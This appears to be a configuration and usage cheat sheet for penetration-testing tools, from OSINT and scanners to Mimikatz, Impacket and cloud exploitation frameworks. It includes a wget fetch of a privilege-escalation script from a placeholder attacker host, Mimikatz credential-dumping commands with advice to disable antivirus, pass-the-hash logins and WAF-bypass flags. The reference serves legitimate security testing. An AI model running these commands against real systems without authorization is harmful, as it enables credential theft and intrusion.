tools.name: theHarvester
tools.desc: OSINT: emails, subdomains, IPs, URLs, names from 30+ sources
tools.config: Edit ~/.config/theHarvester/api-keys.yaml — add Shodan, Hunter.io, GitHub tokens

tools.name: Amass
tools.desc: Deep DNS enumeration, ASN discovery, infrastructure mapping
tools.config: Create ~/.config/amass/config.ini — add API keys (Shodan, Censys, SecurityTrails)

tools.name: Subfinder
tools.desc: Fast passive subdomain discovery using 50+ sources
tools.config: Create ~/.config/subfinder/provider-config.yaml with API keys

tools.name: httpx
tools.desc: Fast HTTP probing — live host detection, tech fingerprinting
tools.config: No config needed. Pair with subfinder: subfinder -d domain | httpx -sc -title -tech-detect

tools.name: Shodan CLI
tools.desc: Internet-wide search engine — find exposed services, CVEs
tools.config: shodan init YOUR_API_KEY  (get key at shodan.io — free tier available)
tools.paid: Free: 100 queries/month. Membership $49/mo for full access. Essential for professional work.

tools.name: TruffleHog
tools.desc: Find secrets, API keys, credentials in Git repos
tools.config: No config. Just point at a repo: trufflehog git https://github.com/{ORG}/{REPO}

tools.name: Gobuster
tools.desc: Directory/file/DNS/VHost brute-forcing
tools.config: Use SecLists wordlists: git clone https://github.com/danielmiessler/SecLists

tools.name: ffuf
tools.desc: Fastest web fuzzer — APIs, directories, parameters
tools.config: Works out of box. Combine with SecLists.

tools.name: Nmap
tools.desc: #1 network scanner — port scan, service detection, vulnerability scripts
tools.config: NSE scripts at /usr/share/nmap/scripts/  |  Run: nmap --script-updatedb

tools.name: Masscan
tools.desc: Fastest port scanner — scan full internet, millions of packets/sec
tools.config: Requires root. Always rate-limit: --rate 10000. Never run at full speed on engagements.

tools.name: Nuclei
tools.desc: Template-based vuln scanner — 8000+ community templates
tools.config: nuclei -update-templates  (run weekly to get latest checks)

tools.name: Nikto
tools.desc: Web server scanner — outdated software, dangerous files, misconfigs
tools.config: No config needed. Basic: nikto -h {TARGET} -o nikto.html -Format html

tools.name: testssl.sh
tools.desc: Test SSL/TLS configuration on any port
tools.config: No dependencies except bash. Works on any system.

tools.name: Burp Suite Pro
tools.desc: #1 web application security testing platform — proxy, scanner, intruder
tools.config:
Set proxy 127.0.0.1:8080 in browser. Install CA cert: http://burpsuite/cert
Extensions to install: Param Miner, JWT Editor, Active Scan++, Turbo Intruder
tools.paid: Community: free (no scanner). Pro: $449/year. Worth every dollar for professional work.

tools.name: SQLMap
tools.desc: Automated SQL injection detection and exploitation
tools.config: Always use --level 3 --risk 2 for thorough testing. --tamper for WAF bypass.

tools.name: BloodHound
tools.desc: Active Directory attack path visualization
tools.install:
# Get BloodHound binary from GitHub releases
# Install Neo4j: sudo apt install neo4j -y
# Data collection: pip3 install bloodhound
# OR use SharpHound.exe on target
tools.config: sudo neo4j start  |  Username: neo4j, set new password  |  Open BloodHound app

tools.name: CrackMapExec
tools.desc: Swiss army knife for Windows/AD pentesting
tools.config: cme smb {TARGET} -u {USER} -p {PASS} to verify. Pair with Impacket.

tools.name: Metasploit
tools.desc: World's most used penetration testing framework
tools.config:
msfdb init  (initialize PostgreSQL database)
Update weekly: msfupdate

tools.name: Hydra
tools.desc: Fast network login cracker — 50+ protocols
tools.config: Best with SecLists: /usr/share/seclists/Passwords/rockyou.txt

tools.name: Responder
tools.desc: LLMNR/NBT-NS/mDNS poisoner for credential capture
tools.config:
Edit Responder.conf — toggle SMB/HTTP/FTP on/off
Requires root. Run on same network segment as targets.

tools.name: Impacket
tools.desc: Python classes for network protocols — secretsdump, psexec, wmiexec
tools.config: All tools prefixed with 'impacket-': impacket-secretsdump, impacket-psexec, impacket-smbserver

tools.name: John the Ripper
tools.desc: Password hash cracker
tools.config:
john --list=formats  (see supported hash types)
Wordlist: /usr/share/wordlists/rockyou.txt

tools.name: Hashcat
tools.desc: World's fastest GPU password cracker
tools.config:
hashcat -m 0 hash.txt wordlist.txt (MD5)
hashcat -m 1000 hash.txt wordlist.txt (NTLM)
hashcat --benchmark  (test GPU speed)

tools.name: LinPEAS
tools.desc: Linux privilege escalation script — finds 100+ escalation vectors
tools.config: Transfer to target: python3 -m http.server 8080  |  wget http://{ATTACKER}/linpeas.sh

tools.name: WinPEAS
tools.desc: Windows privilege escalation script
tools.install:
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat -o winPEAS.bat
# OR .exe version for more checks
tools.config: Run as current user first, then as higher privilege if escalated

tools.name: Evil-WinRM
tools.desc: WinRM shell — full-featured Windows remote shell for pentesting
tools.config:
evil-winrm -i {TARGET_IP} -u {USER} -p {PASSWORD}
evil-winrm -i {TARGET_IP} -u {USER} -H {NTLM_HASH}  (pass-the-hash)

tools.name: Chisel
tools.desc: TCP/UDP tunnel over HTTP — bypass firewalls and NAT

tools.name: Ligolo-ng
tools.desc: Tunneling via TUN interface — cleaner pivoting than Chisel
tools.config:
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

tools.name: Mimikatz
tools.desc: Extract credentials/hashes/tickets from Windows memory — the red team essential
tools.install:
# Download release from GitHub:
# On Kali: /usr/share/windows-resources/mimikatz/
tools.config:
Needs Admin/SYSTEM. Disable AV first.
Key commands:
sekurlsa::logonpasswords
lsadump::sam
kerberos::list /export

tools.name: AWS CLI
tools.desc: Official AWS command line interface
tools.config:
aws configure
# Enter: Access Key ID, Secret Access Key, Region, Output format

tools.name: ScoutSuite
tools.desc: Multi-cloud security auditing — AWS, Azure, GCP, OCI
tools.config: Requires cloud credentials configured before running

tools.name: Prowler
tools.desc: AWS/Azure/GCP security assessments — CIS, GDPR, HIPAA, SOC2
tools.config: Configure cloud credentials first. prowler aws -f us-east-1

tools.name: Pacu
tools.desc: AWS exploitation framework — IAM privesc, recon, data exfil
tools.install:
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu && pip3 install -r requirements.txt

tools.name: Azure CLI
tools.desc: Official Azure command line interface
tools.install:
pip3 install azure-cli
# OR: curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
tools.config: az login  (opens browser for auth)

tools.name: Burp Suite Pro
tools.desc: Best-in-class for API testing — replay, intruder, scanner all work on APIs
tools.config:
REST API testing: send to Repeater, use Intruder for parameter fuzzing
Install extensions: JWT Editor, OpenAPI Parser, GraphQL Raider
tools.paid: Pro required for scanner. Community is functional for manual testing.

tools.name: Kiterunner
tools.desc: API-aware content discovery — understands route patterns
tools.config:
Download wordlists: https://wordlists.assetnote.io/
Main wordlist: routes-large.kite

tools.name: graphql-cop
tools.desc: GraphQL security auditor — introspection, injection, batching
tools.config: graphql-cop -t https://target.com/graphql -v

tools.name: HTTPie
tools.desc: Human-friendly curl alternative — perfect for API testing
tools.config:
http GET https://api.target.com/users Authorization:'Bearer TOKEN'
http POST https://api.target.com/users name=test role=admin

tools.name: Postman
tools.desc: API platform for building and testing API requests
tools.config:
Import OpenAPI spec to generate all endpoints automatically
Set environment variables for auth tokens

tools.name: Sysreptor
tools.desc: Best self-hosted pentest reporting platform — markdown-based, professional templates
tools.install:
git clone https://github.com/Syslifters/sysreptor && cd sysreptor
docker-compose up -d
tools.config: Default creds in .env file. Change immediately. CVSS calculator built-in.

tools.name: Pandoc
tools.desc: Convert markdown reports to Word/PDF/HTML
tools.install:
sudo apt install pandoc -y
sudo apt install texlive-latex-base  (for PDF)
tools.config:
pandoc report.md -o report.docx
pandoc report.md -o report.pdf --pdf-engine=xelatex

tools.name: Obsidian
tools.desc: Knowledge management — perfect for engagement notes with linking
tools.config: Create vault per client. Use templates for consistent note-taking. Enable backlinks.
